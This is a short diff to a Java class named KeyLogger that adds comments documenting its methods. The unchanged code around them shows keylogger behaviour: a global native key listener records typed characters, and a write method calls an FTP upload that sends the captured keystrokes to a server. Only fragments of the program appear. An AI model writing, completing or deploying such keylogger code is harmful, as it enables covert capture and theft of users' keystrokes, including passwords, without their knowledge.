@@ -25,6 +25,9 @@ public class KeyLogger implements NativeKeyListener {
         }
     }
     
+    /**
+     * Adds key char to LINE whenever key is pressed.
+     */
     public void nativeKeyTyped(NativeKeyEvent e) {
     	switch (e.getRawCode()) {
     	case 8:
@@ -35,10 +38,21 @@ public class KeyLogger implements NativeKeyListener {
     	}
     }
     
+    /**
+     * Registers key listener
+     */
     public static void start() {
         GlobalScreen.addNativeKeyListener(new KeyLogger());
     }
     
+    /**
+     * Call <code>upload</code> method from <code>FTPManager</code>.
+     * Tells whether data is sent to server or not.
+     * 
+     * 
+     * @see org.dot.FTPManager#upload()
+     * @throws Exception
+     */
     public static void write() throws Exception {
     	if (FTPManager.upload())
     		System.out.println("Written.");
